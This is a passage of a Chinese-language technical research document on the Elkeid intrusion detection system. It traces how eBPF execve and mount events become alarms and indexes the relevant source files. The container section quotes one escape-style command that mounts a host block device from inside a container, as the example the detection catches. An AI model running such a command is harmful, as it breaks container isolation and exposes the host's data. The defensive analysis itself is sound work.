    ├─ 采集 argv: construct_args() → 完整命令行
    ├─ 采集 cwd: d_fd_path() → 当前目录
    ├─ 采集 stdin/stdout: d_fd_path(0), d_fd_path(1)
    ├─ 采集 socket: process_socket() → query_ipu() → IP+Port
    ├─ 采集 env: LD_PRELOAD, LD_LIBRARY_PATH, SSH_CONNECTION
    ├─ 采集容器: mntns_id, root_mntns_id, nodename
    ├─ 采集 pidtree: construct_pid_tree() → 12层父进程链
    └─ 采集 MD5: 可执行文件哈希
    │
    ▼
execve_print() → SD_XFER → bpf_perf_event_output()
    │
    ▼
perf ring buffer → Driver Plugin (Rust, schema.rs 解析)
    │
    ▼
Agent Ring Buffer (2048 slots) → gRPC (Snappy 压缩, 100ms 批次)
    │
    ▼
Server Manager /api/v6/alarm/add
    │
    ├─ 异步写入 MongoDB hub_alarm_v1
    ├─ 白名单检查 (5s 间隔)
    │   ├─ 命中白名单 → __hit_wl=true → 过滤
    │   └─ 未命中 → 发布告警
    └─ 告警统计更新
```

### 6.2 容器侧高危命令检测数据流

```
容器内执行命令 (如: mount /dev/sda1 /tmp/host)
    │
    ▼
Linux 内核: mount 系统调用
    │
    ├────────────────────────────────────────────┐
    ▼                                            ▼
eBPF mount hook                           eBPF execve hook
(hids.c:1778-1820)                        (如果是通过 shell 执行)
    │                                            │
    ├─ 采集 dev_name, file_path, fstype          ├─ 采集 argv, pidtree...
    ├─ 采集 mntns_id != root_mntns_id            ├─ 采集 mntns_id
    │   → 确认来自容器                            │   → 确认来自容器
    └─ 输出 DataType 165                         └─ 输出 DataType 59
    │                                            │
    └──────────────────┬─────────────────────────┘
                       ▼
    Agent 侧规则引擎: 匹配 container_escape_mount_drive_detect
                       │
                       ├─ 条件: mntns_id != root_mntns_id (容器)
                       ├─ 条件: dev_name 包含块设备路径
                       └─ 生成告警: HarmLevel=high, RuleType=提权攻击
                       │
                       ▼
    同主机侧流程: gRPC → Server → MongoDB → 白名单 → 告警展示
                       │
                       ▼
    容器元数据关联:
    ├─ Collector Plugin 周期性枚举 Docker/CRI 容器
    ├─ 缓存: pns → (container_id, container_name)
    └─ 告警可关联到具体容器实例
```

### 6.3 主机侧 vs 容器侧检测对比

| 维度 | 主机侧 | 容器侧 |
|------|--------|--------|
| **数据来源** | 相同 eBPF Hook 点 | 相同 eBPF Hook 点 |
| **区分方式** | `mntns_id == root_mntns_id` | `mntns_id != root_mntns_id` |
| **独有规则** | 暴力破解 (Log Monitor) | 容器逃逸 (mount/umh) |
| **共有规则** | 反弹 shell、提权、二进制劫持、RCE 等 | 同左，但可调整阈值 |
| **元数据增强** | hostname, IP | + container_id, container_name, image |
| **误报控制** | 白名单按 exe/argv/pidtree | + 按容器镜像/名称过滤 |

---

## 附录：关键源码文件索引

### 内核态 eBPF 代码

| 文件路径 | 说明 | 关键行号 |
|---------|------|---------|
| `driver/BPF/hids.c` | 主 eBPF 程序 (3591行) | execve hook: 3094, sysret_exec: 2060, mount: 1778, umh: 3355, commit_creds: 3471 |
| `driver/BPF/inc/hids/kprobe_print.h` | 事件字段定义 (545行) | ENTRY_COMMON: 4, execve: 34, mount: 240, umh: 207, commit_creds: 312 |
| `driver/BPF/inc/hids/anti_rootkit_print.h` | 反 Rootkit 事件 | DataType 700-703 |
| `driver/ebpf/hids/hids.h` | proc_tid 结构体 | 38-63 |
| `driver/xfer/xfer.h` | 序列化框架 | ipaddr_ud: 57-65 |

### 用户态 Agent/Plugin 代码

| 文件路径 | 说明 |
|---------|------|
| `plugins/driver/src/transformer/schema.rs` | 事件 schema 定义 (19+ 事件类型) |
| `plugins/driver/src/main.rs` | Driver Plugin 入口 |
| `agent/plugin/plugin.go` | Agent 事件消费 |
| `agent/buffer/buffer.go` | Ring Buffer 管理 |
| `agent/transport/transfer.go` | gRPC 传输 |

### 容器检测代码

| 文件路径 | 说明 |
|---------|------|
| `plugins/collector/container/container.go` | 容器运行时客户端 (Docker/CRI) |
| `plugins/collector/container/enum.go` | 容器状态枚举定义 |
| `plugins/collector/container.go` | 容器资产采集 Handler (DataType 5056) |
| `plugins/collector/process/process.go` | 命名空间比较 (`PnsDiffWithRpns`) |

### 服务端告警代���

| 文件路径 | 说明 |
|---------|------|
| `server/manager/biz/handler/v6/alarm.go` | 告警 API Handler |
| `server/manager/biz/handler/v6/alarm_data_type.go` | 告警数据结构定义 |
| `server/manager/internal/alarm/alarm_const.go` | 告警常量 (等级/类型) |
| `server/manager/internal/alarm/alarm_query.go` | 告警查询逻辑 |
| `server/manager/internal/alarm/alarm_statistics.go` | 告警统计 |
| `server/manager/internal/alarm/alarm_update.go` | 告警状态更新 |
| `server/manager/internal/alarm_whitelist/alarm_whitelist.go` | 白名单引擎 |
| `server/manager/internal/alarm_whitelist/whitelist_const.go` | 白名单匹配字段 |
| `server/manager/internal/dbtask/hub_alarm.go` | 异步批量写入 |

### 文档

| 文件路径 | 说明 |
|---------|------|
| `docs/ElkeidData/hids_rule.md` | 开源检测规则列表 (23条) |
| `docs/ElkeidData/raw_data_desc.md` | 原始数据类型定义 |
| `learning/ebpf_events_research.md` | eBPF 事件体系调研报告 |
